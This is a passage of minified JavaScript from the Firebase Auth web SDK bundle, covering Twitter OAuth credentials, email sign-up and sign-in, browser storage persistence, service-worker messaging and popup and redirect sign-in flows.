 */class an extends Ys{constructor(){super("twitter.com")}static credential(e,n){return or._fromParams({providerId:an.PROVIDER_ID,signInMethod:an.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:n})}static credentialFromResult(e){return an.credentialFromTaggedObject(e)}static credentialFromError(e){return an.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:n,oauthTokenSecret:r}=e;if(!n||!r)return null;try{return an.credential(n,r)}catch{return null}}}an.TWITTER_SIGN_IN_METHOD="twitter.com";an.PROVIDER_ID="twitter.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function au(t,e){return Ks(t,"POST","/v1/accounts:signUp",_r(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lr{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,n,r,i=!1){const s=await Yn._fromIdTokenResponse(e,r,i),o=Tp(r);return new lr({user:s,providerId:o,_tokenResponse:r,operationType:n})}static async _forOperation(e,n,r){await e._updateTokensIfNecessary(r,!0);const i=Tp(r);return new lr({user:e,providerId:i,_tokenResponse:r,operationType:n})}}function Tp(t){return t.providerId?t.providerId:"phoneNumber"in t?"phone":null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nl extends Yt{constructor(e,n,r,i){var s;super(n.code,n.message),this.operationType=r,this.user=i,Object.setPrototypeOf(this,Nl.prototype),this.customData={appName:e.name,tenantId:(s=e.tenantId)!==null&&s!==void 0?s:void 0,_serverResponse:n.customData._serverResponse,operationType:r}}static _fromErrorAndOperation(e,n,r,i){return new Nl(e,n,r,i)}}function Ov(t,e,n,r){return(e==="reauthenticate"?n._getReauthenticationResolver(t):n._getIdTokenResponse(t)).catch(s=>{throw s.code==="auth/multi-factor-auth-required"?Nl._fromErrorAndOperation(t,s,e,r):s})}async function RI(t,e,n=!1){const r=await Rs(t,e._linkToIdToken(t.auth,await t.getIdToken()),n);return lr._forOperation(t,"link",r)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function NI(t,e,n=!1){const{auth:r}=t,i="reauthenticate";try{const s=await Rs(t,Ov(r,i,e,t),n);O(s.idToken,r,"internal-error");const o=Qd(s.idToken);O(o,r,"internal-error");const{sub:l}=o;return O(t.uid===l,r,"user-mismatch"),lr._forOperation(t,i,s)}catch(s){throw(s==null?void 0:s.code)==="auth/user-not-found"&&wt(r,"user-mismatch"),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function bv(t,e,n=!1){const r="signIn",i=await Ov(t,r,e),s=await lr._fromIdTokenResponse(t,r,i);return n||await t._updateCurrentUser(s.user),s}async function PI(t,e){return bv(yr(t),e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Lv(t){const e=yr(t);e._getPasswordPolicyInternal()&&await e._updatePasswordPolicy()}async function xI(t,e,n){var r;const i=yr(t),s={returnSecureToken:!0,email:e,password:n,clientType:"CLIENT_TYPE_WEB"};let o;if(!((r=i._getRecaptchaConfig())===null||r===void 0)&&r.emailPasswordEnabled){const u=await Rl(i,s,"signUpPassword");o=au(i,u)}else o=au(i,s).catch(async u=>{if(u.code==="auth/missing-recaptcha-token"){console.log("Sign-up is protected by reCAPTCHA for this project. Automatically triggering the reCAPTCHA flow and restarting the sign-up flow.");const c=await Rl(i,s,"signUpPassword");return au(i,c)}throw u});const l=await o.catch(u=>{throw u.code==="auth/password-does-not-meet-requirements"&&Lv(t),u}),a=await lr._fromIdTokenResponse(i,"signIn",l);return await i._updateCurrentUser(a.user),a}function AI(t,e,n){return PI(Ie(t),vi.credential(e,n)).catch(async r=>{throw r.code==="auth/password-does-not-meet-requirements"&&Lv(t),r})}function OI(t,e,n,r){return Ie(t).onIdTokenChanged(e,n,r)}function bI(t,e,n){return Ie(t).beforeAuthStateChanged(e,n)}function LI(t,e,n,r){return Ie(t).onAuthStateChanged(e,n,r)}const Pl="__sak";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Dv{constructor(e,n){this.storageRetriever=e,this.type=n}_isAvailable(){try{return this.storage?(this.storage.setItem(Pl,"1"),this.storage.removeItem(Pl),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,n){return this.storage.setItem(e,JSON.stringify(n)),Promise.resolve()}_get(e){const n=this.storage.getItem(e);return Promise.resolve(n?JSON.parse(n):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function DI(){const t=Ae();return Xd(t)||fa(t)}const MI=1e3,UI=10;class Mv extends Dv{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,n)=>this.onStorageEvent(e,n),this.listeners={},this.localCache={},this.pollTimer=null,this.safariLocalStorageNotSynced=DI()&&iI(),this.fallbackToPolling=Rv(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const n of Object.keys(this.listeners)){const r=this.storage.getItem(n),i=this.localCache[n];r!==i&&e(n,i,r)}}onStorageEvent(e,n=!1){if(!e.key){this.forAllChangedKeys((o,l,a)=>{this.notifyListeners(o,a)});return}const r=e.key;if(n?this.detachListener():this.stopPolling(),this.safariLocalStorageNotSynced){const o=this.storage.getItem(r);if(e.newValue!==o)e.newValue!==null?this.storage.setItem(r,e.newValue):this.storage.removeItem(r);else if(this.localCache[r]===e.newValue&&!n)return}const i=()=>{const o=this.storage.getItem(r);!n&&this.localCache[r]===o||this.notifyListeners(r,o)},s=this.storage.getItem(r);rI()&&s!==e.newValue&&e.newValue!==e.oldValue?setTimeout(i,UI):i()}notifyListeners(e,n){this.localCache[e]=n;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(n&&JSON.parse(n))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,n,r)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:n,newValue:r}),!0)})},MI)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,n){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,n){await super._set(e,n),this.localCache[e]=JSON.stringify(n)}async _get(e){const n=await super._get(e);return this.localCache[e]=JSON.stringify(n),n}async _remove(e){await super._remove(e),delete this.localCache[e]}}Mv.type="LOCAL";const FI=Mv;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Uv extends Dv{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,n){}_removeListener(e,n){}}Uv.type="SESSION";const Fv=Uv;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function jI(t){return Promise.all(t.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(n){return{fulfilled:!1,reason:n}}}))}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class pa{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const n=this.receivers.find(i=>i.isListeningto(e));if(n)return n;const r=new pa(e);return this.receivers.push(r),r}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const n=e,{eventId:r,eventType:i,data:s}=n.data,o=this.handlersMap[i];if(!(o!=null&&o.size))return;n.ports[0].postMessage({status:"ack",eventId:r,eventType:i});const l=Array.from(o).map(async u=>u(n.origin,s)),a=await jI(l);n.ports[0].postMessage({status:"done",eventId:r,eventType:i,response:a})}_subscribe(e,n){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(n)}_unsubscribe(e,n){this.handlersMap[e]&&n&&this.handlersMap[e].delete(n),(!n||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}pa.receivers=[];/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function eh(t="",e=10){let n="";for(let r=0;r<e;r++)n+=Math.floor(Math.random()*10);return t+n}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zI{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,n,r=50){const i=typeof MessageChannel<"u"?new MessageChannel:null;if(!i)throw new Error("connection_unavailable");let s,o;return new Promise((l,a)=>{const u=eh("",20);i.port1.start();const c=setTimeout(()=>{a(new Error("unsupported_event"))},r);o={messageChannel:i,onMessage(d){const h=d;if(h.data.eventId===u)switch(h.data.status){case"ack":clearTimeout(c),s=setTimeout(()=>{a(new Error("timeout"))},3e3);break;case"done":clearTimeout(s),l(h.data.response);break;default:clearTimeout(c),clearTimeout(s),a(new Error("invalid_response"));break}}},this.handlers.add(o),i.port1.addEventListener("message",o.onMessage),this.target.postMessage({eventType:e,eventId:u,data:n},[i.port2])}).finally(()=>{o&&this.removeMessageHandler(o)})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Pt(){return window}function BI(t){Pt().location.href=t}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function jv(){return typeof Pt().WorkerGlobalScope<"u"&&typeof Pt().importScripts=="function"}async function HI(){if(!(navigator!=null&&navigator.serviceWorker))return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function WI(){var t;return((t=navigator==null?void 0:navigator.serviceWorker)===null||t===void 0?void 0:t.controller)||null}function $I(){return jv()?self:null}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const zv="firebaseLocalStorageDb",VI=1,xl="firebaseLocalStorage",Bv="fbase_key";class Qs{constructor(e){this.request=e}toPromise(){return new Promise((e,n)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{n(this.request.error)})})}}function ma(t,e){return t.transaction([xl],e?"readwrite":"readonly").objectStore(xl)}function qI(){const t=indexedDB.deleteDatabase(zv);return new Qs(t).toPromise()}function Sc(){const t=indexedDB.open(zv,VI);return new Promise((e,n)=>{t.addEventListener("error",()=>{n(t.error)}),t.addEventListener("upgradeneeded",()=>{const r=t.result;try{r.createObjectStore(xl,{keyPath:Bv})}catch(i){n(i)}}),t.addEventListener("success",async()=>{const r=t.result;r.objectStoreNames.contains(xl)?e(r):(r.close(),await qI(),e(await Sc()))})})}async function Ip(t,e,n){const r=ma(t,!0).put({[Bv]:e,value:n});return new Qs(r).toPromise()}async function GI(t,e){const n=ma(t,!1).get(e),r=await new Qs(n).toPromise();return r===void 0?null:r.value}function kp(t,e){const n=ma(t,!0).delete(e);return new Qs(n).toPromise()}const KI=800,YI=3;class Hv{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await Sc(),this.db)}async _withRetries(e){let n=0;for(;;)try{const r=await this._openDb();return await e(r)}catch(r){if(n++>YI)throw r;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return jv()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=pa._getInstance($I()),this.receiver._subscribe("keyChanged",async(e,n)=>({keyProcessed:(await this._poll()).includes(n.key)})),this.receiver._subscribe("ping",async(e,n)=>["keyChanged"])}async initializeSender(){var e,n;if(this.activeServiceWorker=await HI(),!this.activeServiceWorker)return;this.sender=new zI(this.activeServiceWorker);const r=await this.sender._send("ping",{},800);r&&!((e=r[0])===null||e===void 0)&&e.fulfilled&&!((n=r[0])===null||n===void 0)&&n.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||WI()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await Sc();return await Ip(e,Pl,"1"),await kp(e,Pl),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,n){return this._withPendingWrite(async()=>(await this._withRetries(r=>Ip(r,e,n)),this.localCache[e]=n,this.notifyServiceWorker(e)))}async _get(e){const n=await this._withRetries(r=>GI(r,e));return this.localCache[e]=n,n}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(n=>kp(n,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(i=>{const s=ma(i,!1).getAll();return new Qs(s).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const n=[],r=new Set;for(const{fbase_key:i,value:s}of e)r.add(i),JSON.stringify(this.localCache[i])!==JSON.stringify(s)&&(this.notifyListeners(i,s),n.push(i));for(const i of Object.keys(this.localCache))this.localCache[i]&&!r.has(i)&&(this.notifyListeners(i,null),n.push(i));return n}notifyListeners(e,n){this.localCache[e]=n;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(n)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),KI)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,n){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}Hv.type="LOCAL";const QI=Hv;new Gs(3e4,6e4);/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function XI(t,e){return e?Mt(e):(O(t._popupRedirectResolver,t,"argument-error"),t._popupRedirectResolver)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class th extends Jd{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return Gr(e,this._buildIdpRequest())}_linkToIdToken(e,n){return Gr(e,this._buildIdpRequest(n))}_getReauthenticationResolver(e){return Gr(e,this._buildIdpRequest())}_buildIdpRequest(e){const n={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(n.idToken=e),n}}function JI(t){return bv(t.auth,new th(t),t.bypassAuthState)}function ZI(t){const{auth:e,user:n}=t;return O(n,e,"internal-error"),NI(n,new th(t),t.bypassAuthState)}async function ek(t){const{auth:e,user:n}=t;return O(n,e,"internal-error"),RI(n,new th(t),t.bypassAuthState)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Wv{constructor(e,n,r,i,s=!1){this.auth=e,this.resolver=r,this.user=i,this.bypassAuthState=s,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(n)?n:[n]}execute(){return new Promise(async(e,n)=>{this.pendingPromise={resolve:e,reject:n};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(r){this.reject(r)}})}async onAuthEvent(e){const{urlResponse:n,sessionId:r,postBody:i,tenantId:s,error:o,type:l}=e;if(o){this.reject(o);return}const a={auth:this.auth,requestUri:n,sessionId:r,tenantId:s||void 0,postBody:i||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(l)(a))}catch(u){this.reject(u)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return JI;case"linkViaPopup":case"linkViaRedirect":return ek;case"reauthViaPopup":case"reauthViaRedirect":return ZI;default:wt(this.auth,"internal-error")}}resolve(e){Vt(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){Vt(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tk=new Gs(2e3,1e4);class Fr extends Wv{constructor(e,n,r,i,s){super(e,n,i,s),this.provider=r,this.authWindow=null,this.pollId=null,Fr.currentPopupAction&&Fr.currentPopupAction.cancel(),Fr.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return O(e,this.auth,"internal-error"),e}async onExecution(){Vt(this.filter.length===1,"Popup operations only handle one event");const e=eh();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(n=>{this.reject(n)}),this.resolver._isIframeWebStorageSupported(this.auth,n=>{n||this.reject(Nt(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){var e;return((e=this.authWindow)===null||e===void 0?void 0:e.associatedEvent)||null}cancel(){this.reject(Nt(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,Fr.currentPopupAction=null}pollUserCancellation(){const e=()=>{var n,r;if(!((r=(n=this.authWindow)===null||n===void 0?void 0:n.window)===null||r===void 0)&&r.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(Nt(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,tk.get())};e()}}Fr.currentPopupAction=null;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const nk="pendingRedirect",Wo=new Map;class rk extends Wv{constructor(e,n,r=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],n,void 0,r),this.eventId=null}async execute(){let e=Wo.get(this.auth._key());if(!e){try{const r=await ik(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(r)}catch(n){e=()=>Promise.reject(n)}Wo.set(this.auth._key(),e)}return this.bypassAuthState||Wo.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const n=await this.auth._redirectUserForId(e.eventId);if(n)return this.user=n,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function ik(t,e){const n=lk(e),r=ok(t);if(!await r._isAvailable())return!1;const i=await r._get(n)==="true";return await r._remove(n),i}function sk(t,e){Wo.set(t._key(),e)}function ok(t){return Mt(t._redirectPersistence)}function lk(t){return Ho(nk,t.config.apiKey,t.name)}async function ak(t,e,n=!1){const r=yr(t),i=XI(r,e),o=await new rk(r,i,n).execute();return o&&!n&&(delete o.user._redirectEventId,await r._persistUserIfCurrent(o.user),await r._setRedirectUser(null,e)),o}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const uk=10*60*1e3;class ck{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let n=!1;return this.consumers.forEach(r=>{this.isEventForConsumer(e,r)&&(n=!0,this.sendToConsumer(e,r),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!dk(e)||(this.hasHandledPotentialRedirect=!0,n||(this.queuedRedirectEvent=e,n=!0)),n}sendToConsumer(e,n){var r;if(e.error&&!$v(e)){const i=((r=e.error.code)===null||r===void 0?void 0:r.split("auth/")[1])||"internal-error";n.onError(Nt(this.auth,i))}else n.onAuthEvent(e)}isEventForConsumer(e,n){const r=n.eventId===null||!!e.eventId&&e.eventId===n.eventId;return n.filter.includes(e.type)&&r}hasEventBeenHandled(e){return 